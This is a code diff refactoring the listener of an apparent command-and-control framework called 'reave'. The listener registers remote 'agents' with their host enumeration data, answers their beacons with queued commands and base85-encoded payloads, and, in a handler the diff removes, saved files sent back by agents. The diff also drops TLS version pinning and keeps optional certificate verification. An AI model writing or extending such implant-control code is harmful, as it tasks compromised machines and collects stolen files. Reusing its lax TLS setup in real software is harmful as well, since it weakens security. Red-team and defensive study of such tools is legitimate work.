@@ -6,11 +6,11 @@ import threading
 import logging
 import time
 import json
-import zlib
 import base64
 from rich import print
 from common.agent import Agent
 from common.responses import serve_http
+from common.protocol import Protocol
 
 
 class Listener(object):
@@ -18,44 +18,23 @@ class Listener(object):
         self.uuid = uuid.uuid4()
         self.host = host
         self.port = port
-
         self.agents = agents
         self.listeners = listeners
         self.secret = secret
-
-        self.download_folder = "/tmp/downloads/"
-
         self._keyboard_interrupt = _keyboard_interrupt
 
         self.logger = logging.getLogger(__name__)
         logging.debug(str(self.uuid) + " Listener spawned")
 
-    def STDOUT(self, json_stub):
-        print(json_stub["data"])
-        return '_response{"status" : "ACK"}'.encode()
-
-    def STDERR(self, json_stub):
-        print("[red]" + json_stub["data"] + "[/red]")
-        return '_response{"status" : "ACK"}'.encode()
-
-    def AGENT_ERROR(self, json_stub):
-        return '_response{"status" : "ACK"}'.encode()
-
-    def FILE_TRANSFER(self, json_stub):
-        logging.debug(str(self.uuid) + " Got BLOB fragment")
-        blob_data = zlib.decompress(base64.b85decode(json_stub["data"]))
-        blob_offset = json_stub["offset"]
-        blob_name = json_stub["filename"]
-        if not os.path.exists(self.download_folder):
-            os.makedirs(self.download_folder)
-        with open(self.download_folder + blob_name, "ab") as b:
-            b.seek(blob_offset)
-            b.write(blob_data)
-        response_packet_stub = {"status": "ACK", "offset": blob_offset}
-        cmd_pkt = "_response" + json.dumps(response_packet_stub)
-        return cmd_pkt.encode()
-
     def get_response(self, json_stub):
+        """
+        Provides the beaconing agent with a response. Current methods are 
+        stored in protocol.py. If the agent sends a response status that 
+        is not reflected in those methods, the listener will return an
+        ERR_UNKNOWN_METHOD response. 
+
+        This will always update the lastseen time of the agent. 
+        """
         agent_uuid = json_stub["uuid"]
         response = json_stub["data"]
 
@@ -63,37 +42,50 @@ class Listener(object):
             if uuid == agent_uuid and response:
                 agent.update_lastseen()
 
-        # Custom protocol methods
-        method = getattr(self, json_stub["status"])
+        method = getattr(Protocol, json_stub["status"])
         if method:
             return method(json_stub)
 
-        return '_response{"status" : "ERR_UNKNOWN_METHOD"}'.encode()
+        return Protocol.ERR_UNKNOWN_METHOD
 
     def associate_agent(self, json_stub):
-        agent_uuid = json_stub["uuid"]  # this should probably incorporate server secret
+        """
+        Provides an initial method for associating an agent. If 
+        the agent has already been seen, this will update the 
+        agent's lastseen time. 
+        """
+        # TODO: modify agent uuid with server-side secret
+        agent_uuid = json_stub["uuid"] 
         logging.debug(str(self.uuid) + " Associating agent with UUID: " + agent_uuid)
+
+        # Check if the agent is already associated
         for uuid, agent in self.agents.items():
             if uuid == agent_uuid:
                 logging.debug(
                     str(self.uuid) + " Agent already seen! Updating lastseen time."
                 )
                 agent.update_lastseen()
+                return Protocol.ACK
 
-        lastseen = time.time()
-        enumdata = json_stub["enumdata"]
-        tmp_agent = Agent(self, agent_uuid, lastseen, enumdata)
-        self.agents[agent_uuid] = tmp_agent
-
+        self.agents[agent_uuid] = Agent(self, agent_uuid, time.time(), json_stub["enumdata"])
         logging.debug(str(self.uuid) + " Agent associated successfully.")
-        return '_response{"status" : "ACK"}'.encode()
+        return Protocol.ACK
 
     def handle_beacon(self, json_stub):
+        """
+        Handles an agent's beacon request. This method will always 
+        update an agent's last seen time. It will then query the 
+        agent for outstanding commands or payloads and send them
+        encoded in base85.
+
+        Pending commands will be sent with higher precedence than
+        pending payloads. In the case that there are neither 
+        commands or payloads, these will be set to None. 
+        """
         agent_uuid = json_stub["uuid"]
         for uuid, agent in self.agents.items():
             if uuid == agent_uuid:
                 agent.update_lastseen()
-                # Commands take precedence over payloads
                 command = agent.get_command()
                 if command:
                     response_packet_stub = {
@@ -123,6 +115,11 @@ class Listener(object):
                 return cmd_pkt.encode()
 
     def handle_proto_msg(self, proto_msg):
+        """
+        Method will parse incoming data and send proper agent messages
+        to the appropriate handler. If the client is not an agent, it
+        will serve a static website under reave/resource/www.
+        """
         logging.debug(str(self.uuid) + " Handling protocol message: " + proto_msg)
         if "_associate" in proto_msg:
             try:
@@ -199,10 +196,7 @@ class Listener(object):
         while not self._keyboard_interrupt.is_set():
             try:
                 connection, address = self.sock.accept()
-                # Upgrade socket to TLS
                 context = ssl.SSLContext()
-                context.maximum_version = ssl.TLSVersion.TLSv1_2
-                context.minimum_version = ssl.TLSVersion.TLSv1_2
                 context.verify_mode = ssl.CERT_OPTIONAL
                 context.load_cert_chain("reave/data/cert.pem")
                 wrapped_socket = context.wrap_socket(
